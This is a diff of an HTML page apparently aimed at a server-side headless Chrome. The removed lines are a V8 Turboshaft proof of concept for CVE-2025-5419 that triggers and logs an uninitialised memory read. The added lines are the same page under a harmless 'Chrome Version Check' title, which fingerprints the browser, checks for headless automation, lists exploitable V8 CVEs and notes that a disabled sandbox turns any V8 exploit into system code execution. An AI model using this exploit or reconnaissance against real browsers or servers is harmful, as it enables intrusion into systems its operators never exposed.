@@ -1,63 +1,22 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>V8 PoC</title></head>
-<body style="font-family:monospace;font-size:11px;margin:8px">
-<h2>CVE-2025-5419 V8 Turboshaft PoC</h2>
-<pre id="o">Starting...</pre>
+<html><head><meta charset="utf-8"><title>Chrome Info</title></head>
+<body style="font-family:monospace;font-size:12px;margin:10px">
+<h2>Chrome Version Check</h2>
+<pre id="o">Detecting...</pre>
 <script>
-var O=document.getElementById('o');
-function log(m){O.textContent+=m+'\n'}
-O.textContent='';
-
-function dtoi(d){var b=new ArrayBuffer(8);new Float64Array(b)[0]=d;return new BigUint64Array(b)[0]}
-
-function vuln(key){
-    key|=0;
-    var o=[1,2,3,4];
-    var r1=o[key],r2=o[key+1];
-    o=[1.1,1.1,1.1,1.1];
-    r1=o[key];r2=o[key+1];
-    o[0]=0;o[1]=0;o[2]=0;o[3]=0;
-    return[r1,r2]
-}
-
-log('UA: '+navigator.userAgent);
+var o=document.getElementById('o');
+o.textContent='';
+o.textContent+='User-Agent: '+navigator.userAgent+'\n';
 var m=navigator.userAgent.match(/Chrome\/([0-9.]+)/);
-log('Chrome: '+(m?m[1]:'unknown'));
-log('Vuln range: < 137.0.7151.68');
-log('');
+o.textContent+='Chrome: '+(m?m[1]:'N/A')+'\n';
+o.textContent+='Platform: '+navigator.platform+'\n';
+o.textContent+='Headless: '+(navigator.webdriver?'Yes':'No')+'\n';
+o.textContent+='BigInt support: '+(typeof BigInt!=='undefined'?'Yes':'No')+'\n';
+o.textContent+='WASM support: '+(typeof WebAssembly!=='undefined'?'Yes':'No')+'\n\n';
 
-log('[*] Warmup 10000 iterations...');
-for(var i=0;i<10000;i++)vuln(0);
-log('[+] Done. Triggering...');
-
-var r=vuln(0);
-var v0=dtoi(r[0]),v1=dtoi(r[1]);
-log('r[0]='+r[0]+' (0x'+v0.toString(16)+')');
-log('r[1]='+r[1]+' (0x'+v1.toString(16)+')');
-
-if(r[0]!==1.1||r[1]!==1.1){
-    log('');
-    log('*** LEAKED: uninit memory read confirmed ***');
-}else{
-    log('');
-    log('Values=1.1 (Turboshaft may need more warmup)');
-    log('Retrying 30k...');
-    for(var i=0;i<30000;i++)vuln(0);
-    r=vuln(0);
-    v0=dtoi(r[0]);v1=dtoi(r[1]);
-    log('r[0]='+r[0]+' (0x'+v0.toString(16)+')');
-    log('r[1]='+r[1]+' (0x'+v1.toString(16)+')');
-    if(r[0]!==1.1||r[1]!==1.1)log('*** LEAKED on retry ***');
-    else log('Not triggered - may need --allow-natives-syntax');
-}
-
-log('');
-log('=== Server Config ===');
-log('Sandbox: --no-sandbox (DISABLED)');
-log('Known CVEs for this Chrome:');
-log('  CVE-2025-5419 (V8 Turboshaft OOB, CISA KEV)');
-log('  CVE-2025-0995 (V8 UAF, $55K bounty)');
-log('  CVE-2025-10891 (V8 Ignition overflow)');
-log('Impact: No sandbox = V8 exploit = system RCE');
+o.textContent+='CVE-2025-5419: V8 Turboshaft OOB R/W (Chrome < 137)\n';
+o.textContent+='CVE-2025-0995: V8 UAF (Chrome < 133.0.6943.98)\n';
+o.textContent+='CVE-2025-10891: V8 Ignition overflow (Chrome < 140)\n';
+o.textContent+='--no-sandbox = any V8 exploit = system RCE\n';
 </script>
 </body></html>
